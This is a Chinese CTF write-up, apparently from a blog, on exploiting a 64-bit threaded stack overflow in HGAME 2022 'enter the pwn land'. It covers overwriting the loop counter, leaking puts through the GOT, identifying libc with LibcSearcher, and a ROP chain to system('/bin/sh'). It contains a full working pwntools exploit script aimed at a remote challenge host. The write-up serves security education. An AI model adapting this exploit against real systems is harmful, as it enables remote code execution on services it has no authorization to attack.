---
title: "Pwn 入门：HGAME 2022 week1 enter the pwn land——线程栈、循环变量覆盖与没有 libc 的 ret2libc"
date: 2026-11-23 15:00:00
updated: 2026-11-23 15:00:00
categories:
  - CTF
  - Pwn
  - 栈溢出
tags:
  - Pwn
  - 栈溢出
  - ROP
  - ret2libc
  - 泄露 libc
  - LibcSearcher
  - GOT
  - PLT
  - 多线程
  - 64位
  - pwntools
  - HGAME
description: 一道很典型的 64 位 ROP 题：溢出发生在子线程里，main 用 while(1) 不停创建线程，刚好白给第二次利用机会。真正卡人的是 read 一次只读 1 字节、遇到 \n 就停，而循环变量 i 恰好躺在缓冲区后面——写到这里时必须把 i 的值“写回去”，否则下一次 read 就写到天边去了。题目没给 libc，还要先泄露 puts 的真实地址，再用 LibcSearcher 反查版本、算基址，最后二段打 system('/bin/sh')。
difficulty: 入门
topic: Pwn 入门
series: Pwn 入门
series_order: 8
permalink: 2026/11/23/pwn-ctf-hgame2022-enter-the-pwn-land/
---

{% note primary %}
**一分钟速览**

- **难度**：入门偏进阶（做完 [Jarvis OJ level2_x64](/2026/11/18/pwn-ctf-jarvisoj-level2-x64/) 之后，正好练“没有 libc 的 ret2libc”和“两段式利用”）
- **考点**：64 位 ROP、线程栈、逐字节 `read`、循环变量覆盖、GOT 泄露、ret2libc、LibcSearcher、栈对齐
- **保护**：No Canary、No PIE、NX enabled（从反汇编能确定代码地址固定、函数没有 Canary 检查；题目本身是动态链接）
- **漏洞**：`test_thread` 里 `char s[40]`，却对 `s[i]` 逐字节读到 `i == 4095`
- **关键偏移**：`0x30` 到保存的 `rbp`，`0x38` 到返回地址；其中 `0x2c` 是循环变量 `i`
- **关键地址**：`main = 0x401260`、`pop rdi; ret = 0x401313`、`ret = 0x40101a`
- **利用链**：第一段 `pop rdi; puts_got; puts_plt; main` 泄露 libc → 第二段 `ret; pop rdi; /bin/sh; system`
- **难点**：`0x2c` 处必须写 `p32(0x2c)` 把循环变量“补回去”；payload 里不能出现 `0x0a`
- **结果**：`system("/bin/sh")` 拿到 shell，`ls` 没看到 flag，进 `/home/ctf` 读 `flag.txt`
- **思考题**：文中有 9 道，答案默认折叠，建议先自己想一遍
{% endnote %}

{% note info %}
**阅读说明**

- **前置知识**：栈溢出、64 位调用约定、ROP、GOT/PLT、pwntools 基本用法。如果还没做过 64 位 ret2plt，建议先看 [Jarvis OJ level2_x64](/2026/11/18/pwn-ctf-jarvisoj-level2-x64/)。
- **工具**：`file`、`checksec`、IDA、`gdb` + pwndbg、pwntools、`LibcSearcher`
- **环境**：Linux（Kali / Ubuntu）。文中的靶场地址是当时的临时环境，现在多半已经失效，请换成自己的靶场或本地环境
- **这里的 libc 情况**：题目**没有给** libc 文件，所以要靠泄露 + `LibcSearcher` 反查；文中也给了“如果给了 libc”的写法
- 本文所有操作仅用于**授权靶场和本地环境**，请勿对未授权的目标做任何测试
{% endnote %}

{% note default %}
**做题路线**

`IDA 看 main` → `发现 while(1) 创建线程` → `看 test_thread 找溢出` → `数清楚 s / v3 / i / saved rbp 的位置` → `意识到 i 会被覆盖` → `找 gadget` → `第一段泄露 puts` → `LibcSearcher 算基址` → `第二段打 system` → `拿 shell 读 flag`
{% endnote %}

## 先把程序看明白

这道题是经典的 ROP 类型题目。先直接看 `main`：

![IDA 里的 main](01-main.png)

*图 1：main 里是一个 `while(1)`，循环里 `pthread_create` 创建线程，再 `pthread_join` 等它结束*

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  pthread_t newthread; // [rsp+8h] [rbp-8h] BYREF

  init_io(argc, argv, envp);
  while ( 1 )
  {
    pthread_create(&newthread, 0LL, (void *(*)(void *))test_thread, 0LL);
    pthread_join(newthread, 0LL);
  }
}
```

几个信息先记下来：

- 真正的输入处理在 `test_thread` 里，溢出点也在那；
- `main` 是 `__noreturn` 的 `while(1)`，线程结束之后会**再创建一个新线程**；
- 这一点后面很关键：**它可以白给我们第二次输入机会**。

再看 `test_thread`：

![IDA 里的 test_thread](02-test-thread.png)

*图 2：`s[40]`、`v3`、`i` 三个局部变量；`for` 循环一次读 1 字节，遇到 `\n` 就退出*

```c
int __fastcall test_thread(void *a1)
{
  char s[40]; // [rsp+0h] [rbp-30h] BYREF
  int v3;     // [rsp+28h] [rbp-8h]
  int i;      // [rsp+2Ch] [rbp-4h]

  for ( i = 0; i <= 4095; ++i )
  {
    v3 = read(0, &s[i], 1uLL);
    if ( s[i] == 10 )
      break;
  }
  return puts(s);
}
```

这段代码乍看没什么，但有两个坑：

1. **`s` 只有 40 字节，`i` 却最大能到 4095。** `read` 一次只读 1 字节，但会把这一字节写到 `s[i]`，`i` 超过 40 之后就是越界写，一路能写到返回地址。
2. **循环变量 `i` 就藏在缓冲区后面。** `s` 从 `rbp-0x30` 开始，`v3` 在 `rbp-0x8`，`i` 在 `rbp-0x4`。我们写 payload 的时候会经过 `i` 所在的位置，一不小心就把 `i` 改了。

第 2 点就是这道题最有意思的地方。先别急，我们一步步来。

## 栈长什么样，偏移怎么数

先画 `test_thread` 的栈：

```text
高地址
+--------------------------+  <- rbp + 0x10
| ...                      |
+--------------------------+  <- rbp + 0x8
| 返回地址（8 字节）        |  <- 偏移 0x38
+--------------------------+  <- rbp
| 保存的 rbp（8 字节）      |  <- 偏移 0x30
+--------------------------+  <- rbp - 0x4
| i（4 字节）               |  <- 偏移 0x2c
+--------------------------+  <- rbp - 0x8
| v3（4 字节）              |  <- 偏移 0x28
+--------------------------+  <- rbp - 0x30
| s[40]                    |  <- 偏移 0x00
| ...                      |
+--------------------------+
低地址
```

从 `s` 的开头算：

```text
s      : 偏移 0x00 ~ 0x27  （40 字节）
v3     : 偏移 0x28 ~ 0x2b  （4 字节）
i      : 偏移 0x2c ~ 0x2f  （4 字节）
saved  : 偏移 0x30 ~ 0x37  （8 字节）
返回地址: 偏移 0x38 开始
```

所以：

- 填到保存的 `rbp`：`0x30` 字节；
- 填到返回地址：`0x38` 字节；
- 其中 **`0x2c ~ 0x2f` 这 4 个字节是 `i`**。

如果你只盯着 `s[40]`，可能会以为写 40 字节就到 saved rbp 了。实际不是：`s` 后面还塞了 `v3` 和 `i` 两个 `int`，一共多了 8 字节，所以到 saved rbp 是 `0x30`。

{% note think **思考 01｜`s` 只有 40 字节，为什么偏移是 0x30 而不是 0x28？** %}
因为 `s[40]` 后面并不是直接接保存的 `rbp`。编译器在 `rbp-0x8` 和 `rbp-0x4` 放了两个 `int`：`v3` 和 `i`。

```text
0x28（40）字节的 s
+ 4 字节 v3
+ 4 字节 i
= 0x30 字节，才到保存的 rbp
```

这 8 字节不是“没用”，其中一个正是循环变量 `i`。所以这题不能只数 `sizeof(s)`。
{% endnote %}

## 先找 system？找了一圈，没有

利用栈溢出，第一反应是找现成的后门函数，或者找 `system`。

翻了一圈函数列表：

![函数列表](03-functions.png)

*图 3：能看到 `pthread_create`、`puts`、`read`、`pthread_join`、`test_thread`、`main`，但没有 `system`*

没有 `system`。那咋办？别慌。

**程序里没有 `system`，不代表动态链接库里没有。** 这是一道动态链接的 64 位程序，`system` 只是没有被这个程序导入而已。我们完全可以：

1. 先泄露一个已知 libc 函数的真实地址；
2. 用它反推出 libc 的加载基址；
3. 再算出 `system` 和 `/bin/sh` 的地址；
4. 第二次溢出时调用 `system("/bin/sh")`。

这就是 **ret2libc**。而这道题比一般的 ret2libc 还多一层：**题目没有给你 libc 文件**。

### 没有 libc 文件，怎么知道偏移？

先把原理捋清楚。程序运行时，libc 会被加载到内存里的某个位置，这个位置受 ASLR 影响，每次可能不一样。但 libc 内部的**相对布局**是固定的：

```text
真实地址 = libc 基址 + 函数在 libc 里的偏移
```

- **偏移**：由 libc 文件的版本决定，`puts`、`system`、`/bin/sh` 各有一个固定偏移；
- **基址**：运行时随机，但同一次运行里，所有 libc 符号共用同一个基址。

所以我们只要：

1. 泄露**一个** libc 函数的真实地址；
2. 减去它在这个 libc 版本里的偏移，得到基址；
3. 基址加上 `system` 的偏移，就是 `system` 的真实地址。

问题就剩一个：**我们不知道这是哪个版本的 libc，也就不知道偏移。**

### LibcSearcher：用泄露的地址反查版本

`LibcSearcher` 的思路很朴素：它维护了一个 libc 数据库，你告诉它“我泄露了 `puts`，地址是 `0x7f...`”，它就把数据库里所有“`puts` 偏移满足这个末几位”的 libc 列出来，让你选。

```python
libc = LibcSearcher("puts", puts_addr)
libc_base = puts_addr - libc.dump('puts')      # dump('puts') 是 puts 的偏移
system = libc_base + libc.dump('system')
bin_sh = libc_base + libc.dump('str_bin_sh')
```

注意几个点：

- `LibcSearcher` 返回的是一个**候选集合**里的对象，不是精准匹配。因为地址的低 12 位（页内偏移）对得上，可能同时命中好几个版本，所以要你手动选；
- `libc.dump('puts')` 返回的是**偏移**，不是地址；
- `/bin/sh` 的符号名在 LibcSearcher 里叫 `str_bin_sh`。

{% note think **思考 02｜没有 libc 文件，为什么还能算出 `system` 的地址？** %}
因为 `system` 和 `puts` 在**同一个** libc 里，它们的相对位置是固定的：

```text
system_addr - puts_addr = system_offset - puts_offset
```

就算不知道基址，只要知道 `puts_addr` 和这个版本的偏移表，就能算出 `system_addr`。`LibcSearcher` 干的事就是拿 `puts_addr` 去数据库里反查“哪几个版本的偏移表能对上”，然后让你选。

换句话说：**泄露一个函数的地址，等于泄露了整个 libc 的基址。**
{% endnote %}

### 如果题目给了 libc 文件

写法几乎一样，只是不用猜版本：

```python
libc = ELF("./libc-2.31.so")
libc_base = puts_addr - libc.sym["puts"]
log.success("libc_base: " + hex(libc_base))

system_addr = libc_base + libc.sym["system"]
binsh_addr = libc_base + next(libc.search(b"/bin/sh"))
```

对比一下：

| 情况 | 拿偏移的方式 | 要不要选版本 |
| --- | --- | --- |
| 给了 libc | `libc.sym['system']`、`next(libc.search(b'/bin/sh'))` | 不用，文件就是答案 |
| 没给 libc | `LibcSearcher('puts', addr)` + `dump()` | 要，从候选里挑对的 |

这道题是第二种。

## 泄露谁？怎么泄露？

要泄露 libc 地址，就得让程序**把 GOT 表里的内容打印出来**。

先回忆一下 GOT/PLT：

- `puts@plt` 是程序里一段固定的跳板代码，`call puts@plt` 没问题；
- `puts` 的真实地址存在 `puts@got` 这个槽里；
- 这个槽**只有程序运行起来、第一次调用 `puts` 之后**才会被填成 libc 里的真实地址。

所以我们要做的是：

```text
构造 ROP：pop rdi; ret  →  puts@got  →  puts@plt
```

执行过程：

1. `pop rdi` 把 **`puts@got` 的地址**弹进 `RDI`；
2. 跳到 `puts@plt`，调用 `puts(puts@got)`；
3. `puts` 把 `puts@got` 指向的内存当成字符串打印出来——也就是 `puts` 的**真实地址**那 6 个字节。

这里有个很妙的点：`puts` 收到的是 **GOT 槽的地址**，不是槽里的值。但 `puts` 会去读那个地址上的内容，所以打印出来的正好是槽里存的真实地址。

```python
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
```

为什么要选 `puts`？因为它最省事：C 字符串以 `\x00` 结尾，而 libc 地址的高两位本来就是 `\x00`，`puts` 打印到那里自然停下，刚好输出 6 个字节。而且 `test_thread` 最后本来就调用了 `puts(s)`，说明 `puts@plt` 是现成的。

{% note think **思考 03｜为什么泄露的是 `puts`，不是 `read` 或别的函数？** %}
理论上泄露哪个 libc 函数都行，只要它已经被解析、并且你能把它打印出来。`puts` 方便在两点：

1. 程序里有 `puts@plt`，而且 `test_thread` 结尾刚调用过 `puts(s)`，GOT 已经解析好了；
2. `puts(char *)` 只接受一个参数，用 `pop rdi` 就能喂，而且会一直打印到 `\x00`，正好把地址的 6 个字节完整吐出来。

如果泄露 `read`，也能算基址，只是打印那一步还得另想办法（比如配合 `write`）。这题没必要绕远路。
{% endnote %}

{% note think **思考 04｜为什么 payload 里写 `puts_got`，而不是直接把地址写死？** %}
因为脚本运行时**我们还不知道** `puts` 的真实地址——它受 ASLR 影响，每次运行都不一样。`puts_got` 是 GOT 槽在程序里的**固定地址**（No PIE），脚本可以写死。

我们让程序自己去读那个槽，再打印出来。**我们不知道值，但程序知道。** 这就是“泄露”的本质：借程序的嘴，说出我们不知道的地址。
{% endnote %}

## 第一个大坑：循环变量 i 被我们覆盖了

现在来看溢出本身。

正常思路：`s` 在 `rbp-0x30`，保存的 `rbp` 在 `rbp`，返回地址在 `rbp+8`。那 payload 就是：

```text
'a' * 0x30  +  'a' * 8  +  链
```

看起来没问题，对吗？**先别急着写。** 还记得前面说的吗——`i` 就躺在 `s` 后面。

看反汇编：

```text
0x00000000004011b6 <+0>:     endbr64
0x00000000004011ba <+4>:     push   rbp
0x00000000004011bb <+5>:     mov    rbp,rsp
0x00000000004011be <+8>:     sub    rsp,0x30
0x00000000004011c2 <+12>:    mov    DWORD PTR [rbp-0x4],0x0     ; i = 0
0x00000000004011c9 <+19>:    jmp    0x4011fe <test_thread+72>
0x00000000004011cb <+21>:    mov    eax,DWORD PTR [rbp-0x4]     ; eax = i
0x00000000004011ce <+24>:    cdqe
0x00000000004011d0 <+26>:    lea    rdx,[rbp-0x30]              ; rdx = s
0x00000000004011d4 <+30>:    add    rax,rdx                     ; rax = &s[i]
0x00000000004011d7 <+33>:    mov    edx,0x1
0x00000000004011dc <+38>:    mov    rsi,rax
0x00000000004011df <+41>:    mov    edi,0x0
0x00000000004011e4 <+46>:    call   0x4010b0 <read@plt>         ; read(0, &s[i], 1)
0x00000000004011e9 <+51>:    mov    DWORD PTR [rbp-0x8],eax     ; v3 = 返回值
0x00000000004011ec <+54>:    mov    eax,DWORD PTR [rbp-0x4]     ; 再读一次 i
0x00000000004011ef <+57>:    cdqe
0x00000000004011f1 <+59>:    movzx  eax,BYTE PTR [rbp+rax*1-0x30]  ; s[i]
0x00000000004011f6 <+64>:    cmp    al,0xa
0x00000000004011f8 <+66>:    je     0x401209                    ; 是 '\n' 就退出
0x00000000004011fa <+68>:    add    DWORD PTR [rbp-0x4],0x1     ; i++
0x00000000004011fe <+72>:    cmp    DWORD PTR [rbp-0x4],0xfff
0x0000000000401205 <+79>:    jle    0x4011cb                    ; i <= 4095 继续
0x0000000000401207 <+81>:    jmp    0x40120a
0x0000000000401209 <+83>:    nop
0x000000000040120a <+84>:    lea    rax,[rbp-0x30]
0x000000000040120e <+88>:    mov    rdi,rax
0x0000000000401211 <+91>:    call   0x401090 <puts@plt>         ; puts(s)
0x0000000000401216 <+96>:    nop
0x0000000000401217 <+97>:    leave
0x0000000000401218 <+98>:    ret
```

重点看这两行：

```asm
0x4011fa: add DWORD PTR [rbp-0x4], 0x1   ; i++
0x4011fe: cmp DWORD PTR [rbp-0x4], 0xfff ; i <= 4095
```

`i` 存在 `rbp-0x4`，对应 `s` 的偏移 `0x2c`。当我们写到第 45 个字节（偏移 `0x2c`）时，**正好写到 `i` 自己身上**。

### 如果在这一段填满 'a' 会怎样

假设我们老老实实写 `b'a' * 0x30`。当 `i = 0x2c` 时：

1. `read` 把 `'a' = 0x61` 写进 `s[0x2c]`，也就是 `i` 的最低字节；
2. `i` 从 `0x0000002c` 变成 `0x00000061`；
3. 比较完不是 `\n`，`i++` 变成 `0x62`；
4. 下一次 `read` 的目标变成 `s[0x62]`，已经跑到 `s` 外面很远的地方了；
5. 再写几个字节，`i` 越来越高，最终写到一个非法地址，程序直接崩。

**返回地址根本轮不到我们写。** 这就是“循环变量被覆盖”的坑。

### 正确写法：把 i 的值补回去

既然写 `0x2c` 会覆盖 `i`，那就不写 `'a'`，而是**把 `i` 当前的值原样写回去**。

`i` 现在是多少？写到偏移 `0x2c` 时，前面已经写了 `0x2c` 个字节，所以 `i` 正好是 `0x2c`。

那就写 `p32(0x2c)`：

```python
payload = b'a' * 0x2c + p32(0x2c) + b'a' * 8 + chain
```

`p32(0x2c)` 是 4 个字节：`2c 00 00 00`。逐个看它怎么被写进去：

| 第几个字节 | `read` 写到哪里 | 写入值 | 写完后 `i` |
| --- | --- | --- | --- |
| `0x2c` | `s[0x2c]` = `i` 的最低字节 | `0x2c` | 仍是 `0x2c`，`i++` → `0x2d` |
| `0x2d` | `s[0x2d]` = `i` 的第二个字节 | `0x00` | 仍是 `0x2d`，`i++` → `0x2e` |
| `0x2e` | `s[0x2e]` = `i` 的第三个字节 | `0x00` | 仍是 `0x2e`，`i++` → `0x2f` |
| `0x2f` | `s[0x2f]` = `i` 的第四个字节 | `0x00` | 仍是 `0x2f`，`i++` → `0x30` |

四个字节写完，`i` 刚好变成 `0x30`，下一字节正好落在保存的 `rbp` 上。**严丝合缝。**

这里有个很巧的地方：`0x2c` 既是 `i` 所在的位置，也是写入的那一刻 `i` 的值。写它自己，等于“原地不动”。

{% note think **思考 05｜为什么必须写 `p32(0x2c)`？写 `p32(0x30)` 或 4 个 `\x00` 行不行？** %}
不行，`i` 会跑偏。

- 写 `p32(0x30)`：第一个字节把 `i` 改成 `0x30`，下一字节就写到 `s[0x30]`（保存的 `rbp`）去了，而不是 `i`。从这一刻起 `i` 不再跟着写指针走，后面的 payload 会整体错位。
- 写 4 个 `\x00`：`i` 的低字节变成 `0x00`，`i++` 之后下一次写直接回到 `s[1]`，把开头的 `'a'` 覆盖掉。
- 写 `'a' * 4`：`i` 变成 `0x61616161`，越界写到天边。

只有 `2c 00 00 00` 能让“写指针”和“`i` 的值”保持同步：每写一字节，`i` 的低字节就是当前偏移，高字节保持 0，`i++` 之后再写下一字节，正好推进。

**这不是巧合，是这题最核心的构造。**
{% endnote %}

{% note think **思考 06｜循环里是 `if (s[i] == 10) break;`，那 payload 里能不能出现 `0x0a`？** %}
不能（除非你就是要它结束）。

循环每读一个字节都会检查 `s[i]` 是不是 `0x0a`，是就 `break`。所以：

- payload 里任何位置出现 `0x0a`，循环都会**提前结束**，后面的字节不会写进栈；
- 链子就会被截断，返回地址上只写了一半。

这也是为什么最后要 `sendline`：末尾那个 `\n` 是**故意**用来结束循环的。没有它，`read` 会一直阻塞等输入（`i <= 4095` 还没到上限）。

注意：`\x00` 反而没问题。这里是 `read`，不是 `gets`，它按长度读，不把 `\x00` 当结束符。所以 `p64`/`p32` 里的零字节可以放心发。
{% endnote %}

## 找 gadget

现在地址和偏移都清楚了，开始找 ROP 用的 gadget。

先找 `pop rdi; ret`，64 位下把参数送进第一个参数寄存器 `RDI`：

```bash
ROPgadget --binary ./service | grep 'pop rdi'
```

```text
0x0000000000401313 : pop rdi ; ret
```

再找一个普通的 `ret`，用来对齐栈：

```bash
ROPgadget --binary ./service | grep ': ret'
```

```text
0x000000000040101a : ret
```

还有 `main` 的地址，从 IDA 里直接拿：`0x401260`。这是第一段结束后的“回家地址”。

程序是 No PIE，所以这些地址都可以直接写死。

到这里，第一段要用的东西就齐了：

| 名称 | 地址 | 用途 |
| --- | --- | --- |
| `pop_rdi_ret` | `0x401313` | 把参数弹进 `RDI` |
| `ret` | `0x40101a` | 第二阶段栈对齐 |
| `main` | `0x401260` | 泄露完回到主循环，再来一次 |
| `puts_got` | `elf.got['puts']` | 要泄露的 GOT 槽 |
| `puts_plt` | `elf.plt['puts']` | 用来调用 `puts` |

## 第一阶段：泄露 puts

把上面的东西拼起来：

```python
payload  = b'a' * 0x2c          # 填满到 i 之前
payload += p32(0x2c)            # 把循环变量 i 写回 0x2c
payload += b'a' * 8             # 覆盖保存的 rbp
payload += p64(pop_rdi_ret)     # 第一段的返回地址
payload += p64(puts_got)        # puts 的参数：GOT 槽地址
payload += p64(puts_plt)        # 调用 puts
payload += p64(main)            # puts 返回后回到 main
```

执行顺序：

```text
test_thread 的 ret
  → pop rdi; ret      （把 puts_got 放进 RDI）
  → puts@plt          （puts(puts_got)，打印真实地址）
  → main              （回到主循环，等第二次输入）
```

接收泄露：

```python
puts_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
```

这一行信息量很大，拆开看：

| 片段 | 作用 |
| --- | --- |
| `io.recvuntil(b'\x7f')` | 一直读到出现字节 `0x7f` 为止 |
| `[-6:]` | 取最后 6 个字节，也就是地址的低 6 字节 |
| `.ljust(8, b'\x00')` | 在右边补两个 `\x00`，凑满 8 字节 |
| `u64(...)` | 按小端序解释成 64 位无符号数 |

为什么是 6 字节、为什么以 `0x7f` 结尾？

在常见的 64 位 Linux 用户空间里，libc 映射在 `0x00007f........` 这一段，所以真实地址通常是：

```text
0x00007f1234567890
```

小端存进内存是：

```text
90 78 56 34 12 7f 00 00
```

`puts` 打印时遇到第一个 `\x00` 就停，所以只吐出前 6 个字节，最后一个正好是 `0x7f`。我们在右边补两个 `\x00`（它们代表地址的最高两个字节），就还原成完整的 8 字节小端序。

⚠️ 这不是“绝对保证”：不同系统、不同映射区域，高位不一定总是 `0x7f`。这只是常见情况下的经验写法。

{% note think **思考 07｜`recvuntil(b'\x7f')` 一定可靠吗？如果地址里正好有 `0x7f` 呢？** %}
不一定可靠。它会在**第一个** `0x7f` 处停下。如果地址的低 5 个字节里碰巧出现 `0x7f`，就会提前截断，`[-6:]` 拿到的就不是完整地址，算出来的基址也就错了。

更稳的写法是先吃掉 `puts(s)` 打出来的那一行噪声，再精确读 6 字节：

```python
io.recvline()                      # 吃掉 test_thread 结尾 puts(s) 的输出
puts_addr = u64(io.recvn(6).ljust(8, b'\x00'))
```

因为 `puts` 打印地址后还会补一个 `\n`，`recvn(6)` 读满 6 字节就返回，不会受地址内容影响。

本文复现时用的是 `recvuntil(b'\x7f')`，简单直观；如果偶尔打不通，先怀疑这里被提前截断。
{% endnote %}

## 为什么泄露完要回 main？

第一段链子的最后不是随便接的，是 `p64(main)`。这一步是整道题能“打两枪”的关键。

回到 `main` 之后，`while(1)` 会：

1. 再执行一次 `pthread_create`，创建一个新的 `test_thread`；
2. 新线程重新进入那个逐字节读入的循环，等我们发第二段 payload；
3. 原来的线程则卡在 `pthread_join` 里——但这不影响新线程读输入。

所以看起来像“程序重开了”，实际上是**主循环又生了一个读输入的新线程**。我们因此获得了第二次构造 ROP 的机会。

如果第一段结束不回 `main`，而是让程序随便崩掉，进程就没了，第二段根本没地方发。

{% note think **思考 08｜第一段为什么回 `main`，而不是回 `test_thread`？** %}
回 `main` 最自然：`main` 的 `while(1)` 本来就会 `pthread_create` 一个新线程，正好接上第二次利用。而且 `main` 的序言会重新执行 `push rbp; mov rbp, rsp`，把我们覆盖的垃圾 `rbp` 丢掉，栈帧自动恢复。

理论上直接 `ret` 到 `test_thread` 也能让它再读一轮，但那相当于手动“再调用一次线程函数”，还得多考虑调用约定和栈布局。回 `main` 是出题人留好的入口，没必要舍近求远。
{% endnote %}

## 第二阶段：system('/bin/sh')

泄露到 `puts_addr` 之后，剩下的就是标准 ret2libc：

```python
libc = LibcSearcher("puts", puts_addr)
libc_base = puts_addr - libc.dump('puts')   # dump 返回偏移
system = libc_base + libc.dump('system')
bin_sh = libc_base + libc.dump('str_bin_sh')
```

然后构造第二段：

```python
payload  = b'a' * 0x2c
payload += p32(0x2c)
payload += b'a' * 8
payload += p64(ret)             # 栈对齐
payload += p64(pop_rdi_ret)
payload += p64(bin_sh)          # RDI = "/bin/sh"
payload += p64(system)          # system("/bin/sh")
```

注意这里多了一个 `p64(ret)`。这就是老朋友——**栈对齐**。

通过 `ret` 进入 `system` 时，`system` 看到的栈状态要和正常 `call` 之后一样：入口处 `rsp % 16 == 8`。如果直接 `pop rdi; ret → system`，进入 `system` 时是 `0 mod 16`，它内部一旦用到 `movaps` 这种要求 16 字节对齐的指令，就会段错误。

在链子最前面加一个普通 `ret`，把栈指针往后挪 8 字节，就能把对齐修正过来：

```text
[ret] → [pop rdi; ret] → [bin_sh] → [system]
```

{% note think **思考 09｜第二段为什么多一个 `ret`？第一段为什么没加？** %}
第二段的目标是 `system`，它是 libc 函数，内部可能用 `movaps`，对 16 字节对齐敏感，所以要保证进入时 `rsp % 16 == 8`。加一个 `ret` 正好把栈拨过去 8 字节。

第一段的目标是 `puts`，一般也能容忍不对齐，而且这题里 `puts` 没因此崩，所以没加。**这属于“能跑”，不是“最严谨”**。如果第一段在泄露时崩了，也可以在链子最前面补一个 `ret` 再试。

判断方法很简单：地址都对、逻辑都对，就是拿不到 shell / 崩在 libc 里，先怀疑对齐。
{% endnote %}

## 完整 exp

```python
from pwn import *
from LibcSearcher import *

context(os='linux', arch='amd64', log_level='info')

elf = ELF("./service")

HOST = 'node5.anna.nssnode.cn'   # 换成你自己的靶场地址
PORT = 22861
local = 0

if local == 1:
    io = process("./service")
else:
    io = remote(HOST, PORT)

puts_got    = elf.got['puts']
puts_plt    = elf.plt['puts']
pop_rdi_ret = 0x401313
ret         = 0x40101a
main        = 0x401260

def build(chain):
    # 0x2c 字节填充 → 把 i 写回 0x2c → 覆盖 saved rbp → 链
    return b'a' * 0x2c + p32(0x2c) + b'a' * 8 + chain

# ---------- 第一段：泄露 puts ----------
payload  = build(p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main))
io.sendline(payload)

puts_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
log.success('puts_addr: ' + hex(puts_addr))

# ---------- 算 libc ----------
libc = LibcSearcher("puts", puts_addr)
libc_base = puts_addr - libc.dump('puts')     # dump('puts') 是偏移
system = libc_base + libc.dump('system')
bin_sh = libc_base + libc.dump('str_bin_sh')

log.success('libc_base: ' + hex(libc_base))
log.success('system:    ' + hex(system))
log.success('bin_sh:    ' + hex(bin_sh))

# ---------- 第二段：system("/bin/sh") ----------
payload = build(p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system))
io.sendline(payload)

io.interactive()
```

几个细节：

- `build()` 把“绕过 `i`”的固定前缀抽出来，两段共用，少写错一次；
- `p32(0x2c)` 只能用 `p32`，因为 `i` 是 4 字节 `int`；地址一律 `p64`；
- `sendline` 末尾的 `\n` 是循环的结束条件，必须发；
- `context.log_level = 'debug'` 可以看到实际发出去的十六进制，排查截断很方便；
- `LibcSearcher` 可能会让你选版本，见下一节。

## 跑起来：选对 libc

运行到 `LibcSearcher` 这一步，它会列出所有“对得上”的候选：

![LibcSearcher 候选列表](04-libcsearcher.png)

*图 4：`There are multiple libc that meet current constraints`，需要手动选一个*

这里有一个很容易选错的地方。

**不要只看包名后面的 `amd64`。** 看这几个：

```text
0 - libc6-i386_2.39-0ubuntu8.2_amd64
3 - libc6-i386_2.41-1ubuntu2_amd64
8 - libc6-i386_2.39-0ubuntu7_amd64
```

`amd64` 是**包的目标平台**，意思是“这个包装在一台 64 位机器上”；但 `libc6-i386` 装的其实是**给 32 位程序用的 32 位 libc**（64 位系统为了兼容 32 位程序提供的）。同理，名字里带 `i686` 的也都是 32 位。

我们的程序是 64 位 ELF，必须选 64 位 libc。这张截图里，正确选择是编号 **2**：

```text
2 - libc6_2.27-3ubuntu1.3_amd64
```

输入 `2`，回车。

判断库本身位数的可靠办法是看 ELF Class：

```bash
file libc.so.6
readelf -h libc.so.6 | grep Class
```

看到 `ELF 64-bit` 才是对的。

> 如果选错了版本，表现通常是：`system` 能跳过去，但地址是错的，直接段错误。这时换一个候选再试，或者去平台/附件里找真正对应的 libc。

拿到 shell 之后：

```text
$ ls
$ cd /home/ctf
$ ls
flag.txt
$ cat flag.txt
```

`ls` 当前目录没看到 flag，别急，进 `/home/ctf` 就有了。

## 知识点补充

### 1. 线程栈：溢出为什么照样能打

`pthread_create` 会给每个线程分配一块独立的栈（通常是用 `mmap` 拿的），`test_thread` 就在这块栈上运行。它和主线程的栈不是同一块，但**栈溢出、ROP 的规则完全一样**：

- `s`、`rbp`、返回地址都在这块线程栈上；
- 覆盖返回地址之后，`ret` 一样会把控制流带走；
- 线程栈同样受 ASLR 影响，但我们不需要知道它的绝对地址，只需要控制**栈上的内容**。

所以“多线程”并没有让题变难，真正多出来的是 `main` 的 `while(1)`：线程结束后主循环会再造一个，给了我们第二轮。

### 2. 逐字节 read 的特点

| 特性 | 影响 |
| --- | --- |
| 一次只读 1 字节 | payload 再长也没关系，循环会一字节一字节读 |
| 遇 `\n` 就 `break` | payload 里不能有 `0x0a`；末尾必须发 `\n` 结束循环 |
| 二进制安全 | `\x00` 可以正常写入，`p64`/`p32` 不用担心空字节 |
| `i <= 4095` | 最多能写 4096 字节，足够覆盖返回地址并放链 |

和 `gets` 对比：`gets` 遇 `\n` 停、遇 `\x00` 也停；这里只遇 `\n` 停，`\x00` 随便写。这一点对 64 位 ROP 很友好。

### 3. 缓冲区后面的局部变量

编译器把局部变量放在 `rbp` 下面，溢出时会**从低地址往高地址**依次踩过去。常见的“地雷”有：

| 变量 | 常见位置 | 被覆盖的后果 |
| --- | --- | --- |
| 循环变量 / 计数器 | 离缓冲区最近 | 下标跑飞，写到非法地址 |
| 长度 / 状态标志 | 缓冲区后面 | 逻辑被改，可能提前退出或越界更多 |
| 指针 | 缓冲区后面 | 解引用时跳到奇怪的地方 |
| 保存的 `rbp` | `rbp` 处 | 函数返回时 `rbp` 变垃圾 |
| 返回地址 | `rbp+8`（64 位） | 控制流被劫持 |

这题的 `i` 属于第一类。处理思路不是“绕开它”，而是**在 payload 的对应位置写回它原本的值**。很多题都是这个套路：先算清楚每个局部变量在哪，再决定那 4/8 字节填什么。

### 4. GOT/PLT 与泄露

```text
call puts@plt
  → jmp [puts@got]
    → 第一次：跳解析器，解析出 libc 里的 puts，写回 GOT
    → 之后：GOT 里就是 libc puts 的真实地址
```

泄露的关键：**GOT 槽的地址是固定的（No PIE），槽里的值才是运行时地址。** 我们把“槽的地址”当参数传给 `puts`，`puts` 读出“槽里的值”并打印。

| 名称 | 是什么 | 固定吗 |
| --- | --- | --- |
| `puts@plt` | 跳板代码 | 固定（No PIE） |
| `puts@got` | 存真实地址的槽，**槽的地址** | 固定（No PIE） |
| `[puts@got]` | 槽里的**值**，即 libc 地址 | 每次运行可能变 |

### 5. 两段式利用与“回家地址”

